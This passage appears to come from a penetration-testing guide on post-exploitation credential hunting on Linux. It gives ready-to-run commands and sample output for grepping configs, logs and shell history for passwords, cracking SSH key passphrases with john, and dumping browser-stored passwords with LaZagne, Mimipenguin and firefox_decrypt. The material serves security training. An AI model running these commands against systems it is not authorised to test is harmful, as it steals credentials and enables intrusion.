* `-A` - Show all matches
* `-f` - Include files

**Expected output:**

```
[+] Pattern Matches:

/etc/mysql/my.cnf:
  password = "MySQL_Root_Pass!"
  
/home/user/.env:
  DB_PASSWORD=AppDBPass123
  ADMIN_TOKEN=admin_token_xyz789
  API_KEY=sk_live_abc123def456
  
/var/www/laravel/.env:
  DB_PASSWORD=Laravel_DB_Pass!
  MAIL_PASSWORD=SMTP_Pass_123
  AWS_SECRET_ACCESS_KEY=aws_secret_key_abc123
  
[+] Keyword Matches:

/var/log/auth.log:
  user=admin password=AdminPass123 (failed login attempt)
  
/home/user/.bash_history:
  mysql -u dbadmin -pDBPass123!
  ssh admin@10.0.0.5
```

**Why EvilTree is powerful:**

* Finds credentials even with non-standard formatting
* Regex patterns catch variations (password=, passwd:, pwd=)
* Keyword matching finds context around credentials
* Filters out false positives effectively

***

### Log File Analysis

#### Understanding Log Files

**System logs record authentication attempts, command execution, service activity, and errors.** These logs often contain:

* Failed login attempts with usernames (user enumeration)
* Successful authentications (valid credentials)
* Accidentally logged passwords
* Command history from sudo
* Service configuration errors exposing paths

#### Common Log Locations

| Log File                      | Description                                  |
| ----------------------------- | -------------------------------------------- |
| `/var/log/messages`           | Generic system activity logs                 |
| `/var/log/syslog`             | Generic system activity logs (Debian/Ubuntu) |
| `/var/log/auth.log`           | Authentication logs (Debian/Ubuntu)          |
| `/var/log/secure`             | Authentication logs (Red Hat/CentOS)         |
| `/var/log/boot.log`           | Boot process information                     |
| `/var/log/dmesg`              | Hardware and driver messages                 |
| `/var/log/kern.log`           | Kernel warnings and errors                   |
| `/var/log/faillog`            | Failed login attempts                        |
| `/var/log/cron`               | Cron job execution logs                      |
| `/var/log/mail.log`           | Mail server activity                         |
| `/var/log/apache2/access.log` | Apache web server access                     |
| `/var/log/apache2/error.log`  | Apache web server errors                     |
| `/var/log/nginx/access.log`   | Nginx web server access                      |
| `/var/log/nginx/error.log`    | Nginx web server errors                      |
| `/var/log/mysqld.log`         | MySQL database server logs                   |

#### Comprehensive Log Search

**Search all logs for credential-related entries:**

```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

**Expected output:**

```
#### Log file:  /var/log/auth.log
Dec 20 10:15:23 server sshd[1234]: Accepted password for admin from 10.0.0.5 port 54321 ssh2
Dec 20 10:16:45 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
Dec 20 11:30:12 server sshd[5678]: Failed password for root from 192.168.1.100 port 49832 ssh2
Dec 20 11:30:15 server sshd[5678]: Failed password for root from 192.168.1.100 port 49832 ssh2

#### Log file:  /var/log/syslog
Dec 20 09:00:01 server CRON[9012]: (root) CMD (/usr/local/bin/backup.sh --password=BackupPass123)
Dec 20 12:00:01 server systemd[1]: Started Daily Cleanup Job.
```

**Why this matters:**

* Reveals valid usernames
* Shows successful authentication patterns
* Exposes accidentally logged passwords
* Identifies administrative activity

#### Authentication Log Analysis

**Read authentication logs:**

```bash
cat /var/log/auth.log
# or on Red Hat/CentOS
cat /var/log/secure
```

**Expected output:**

```
Dec 20 08:00:15 server sshd[1234]: Accepted publickey for john from 10.0.0.10 port 54321 ssh2: RSA SHA256:abc123...
Dec 20 08:15:23 server sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt update
Dec 20 09:30:45 server su: (to root) john on pts/0
Dec 20 09:30:48 server su: pam_unix(su:session): session opened for user root by john(uid=1000)
Dec 20 10:00:12 server sshd[5678]: Failed password for admin from 192.168.1.50 port 49832 ssh2
Dec 20 10:00:15 server sshd[5678]: Accepted password for admin from 192.168.1.50 port 49832 ssh2
```

**Key information:**

* `Accepted publickey` - SSH key authentication (user has key access)
* `sudo: john : COMMAND=` - Commands run with sudo
* `Failed password` - Failed authentication attempts
* `Accepted password` - Successful password authentication

**Extract sudo commands:**

```bash
grep "COMMAND=" /var/log/auth.log
```

**Expected output:**

```
Dec 20 09:15:23 server sudo: admin : COMMAND=/bin/bash
Dec 20 10:30:45 server sudo: user : COMMAND=/usr/bin/vim /etc/passwd
Dec 20 11:00:12 server sudo: admin : COMMAND=/usr/local/bin/backup.sh --password=BackupPass123
```

#### Web Server Log Analysis

**Apache access logs:**

```bash
cat /var/log/apache2/access.log
cat /var/log/httpd/access_log
```

**Expected output:**

```
10.0.0.5 - - [20/Dec/2025:10:15:23 +0000] "GET /admin.php?user=admin&pass=AdminPass123 HTTP/1.1" 200 1234
10.0.0.10 - - [20/Dec/2025:10:16:45 +0000] "POST /api/login HTTP/1.1" 200 567 {"username":"apiuser","password":"APIPass123!"}
192.168.1.100 - - [20/Dec/2025:11:30:12 +0000] "GET /backup/database.sql HTTP/1.1" 200 156789
```

**Why web logs expose credentials:**

* GET requests with credentials in URL parameters
* POST data logged (misconfigurations)
* API calls with authentication tokens
* Backup files with sensitive data

**Apache error logs:**

```bash
cat /var/log/apache2/error.log
cat /var/log/httpd/error_log
```

**Expected output:**

```
[Mon Dec 20 10:15:23 2025] [error] [client 10.0.0.5] PHP Warning: mysql_connect(): Access denied for user 'dbuser'@'localhost' (using password: YES) in /var/www/html/config.php on line 15
[Mon Dec 20 11:30:45 2025] [error] [client 10.0.0.10] File does not exist: /var/www/html/.env
```

**Why error logs matter:** Application errors often reveal:

* Database connection strings
* File paths to configuration files
* Authentication failures with usernames
* Application internals

***

### Troubleshooting

#### Permission Denied on File Searches

**Problem:** Many credential files return "Permission denied"

**Solution:**

```bash
# Add error suppression
find / -name "*.conf" 2>/dev/null

# Search only accessible directories
find /home /var/www /tmp -name "*.conf" 2>/dev/null

# Use sudo if available
sudo find / -name "*.conf" 2>/dev/null
```

**Why it works:** Focusing on accessible directories is more efficient and produces cleaner output.

#### Encrypted SSH Keys

**Problem:** Found SSH private key but it's password-protected

**Solution:**

```bash
# Identify encrypted key
head -5 id_rsa
```

**Expected output:**

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,ABCD1234EFGH5678
...
```

**Crack the passphrase:**

```bash
# Convert to john format
ssh2john id_rsa > id_rsa.hash

# Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

**Expected output:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (id_rsa)
```

**Why this works:** Many users use weak passphrases on SSH keys, making them crackable with wordlists.

#### Firefox Master Password

**Problem:** Firefox credentials protected by master password

**Solution:**

```bash
# Try firefox_decrypt with empty password
python3 firefox_decrypt.py

# If fails, attempt to crack master password
# Extract key4.db and logins.json
# Use firepwd or similar tools
```

**Alternative:** Use LaZagne which may have bypass techniques:

```bash
python3 laZagne.py browsers -vv
```

**Why this works:** Some Firefox versions had vulnerabilities in master password implementation.

#### No Results from Automated Tools

**Problem:** LaZagne, Mimipenguin return no credentials

**Solution:**

```bash
# Verify tool requirements
# Mimipenguin requires GNOME
ps aux | grep gnome

# LaZagne requires specific Python version
python2.7 --version

# Run with verbose/debug mode
python2.7 laZagne.py all -vv

# Fall back to manual methods
grep -r "password" /home /var 2>/dev/null
```

**Why it works:** Automated tools have specific requirements; manual methods always work.

#### Large File System Searches Take Forever

**Problem:** Comprehensive find commands take hours on large systems

**Solution:**

```bash
# Limit search scope
find /home /var/www /opt -name "*.conf" 2>/dev/null

# Use faster alternatives
locate "*.conf" | grep -v "lib\|share"

# Parallel processing
find / -name "*.conf" 2>/dev/null &
find / -name "*.env" 2>/dev/null &
wait

# Time-limited search
timeout 300 find / -name "*password*" 2>/dev/null
```

**Why it works:** Focused searches and parallel processing dramatically reduce time.

#### Browser Database Locked

**Problem:** Cannot access browser database while browser is running

**Solution:**

```bash
# Copy database files to /tmp
cp ~/.mozilla/firefox/*.default-release/logins.json /tmp/
cp ~/.mozilla/firefox/*.default-release/key4.db /tmp/

# Extract from copies
python3 firefox_decrypt.py /tmp/

# Or kill browser process (if possible)
killall firefox
python3 firefox_decrypt.py
```

**Why it works:** Browsers lock their databases while running; working on copies bypasses the lock.

***

### Quick Reference

#### Fast Credential Discovery

```bash
# Configuration files with credentials
grep -r "password=" /etc /var/www /home 2>/dev/null

# SSH private keys
find / -name "id_rsa" 2>/dev/null

# Command history
cat ~/.bash_history | grep -i "password\|pass"

# Environment variables
env | grep -i "password\|key\|token"
```

#### Database Credentials

```bash
# MySQL config
cat /etc/mysql/my.cnf
cat ~/.my.cnf

# Web app configs
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
```

#### Automated Tools

```bash
# LaZagne (comprehensive)
sudo python2.7 laZagne.py all

# Mimipenguin (memory passwords)
sudo python3 mimipenguin.py

# Firefox credentials
python3 firefox_decrypt.py

# HackBrowserData (all browsers)
./hack-browser-data
```

#### Log Analysis

```bash
# Authentication logs
cat /var/log/auth.log | grep "Accepted\|Failed"

# Sudo commands
grep "COMMAND=" /var/log/auth.log

# Web server logs
cat /var/log/apache2/access.log
```

#### EvilTree Searches

```bash
# Password patterns
python3 eviltree.py -r /var/www -x ".{0,3}passw.{0,3}[=]{1}.{0,18}" -i -v -q -L 3

# Multiple keywords
python3 eviltree.py -r / -k passw,token,key,secret -A -L 3
```
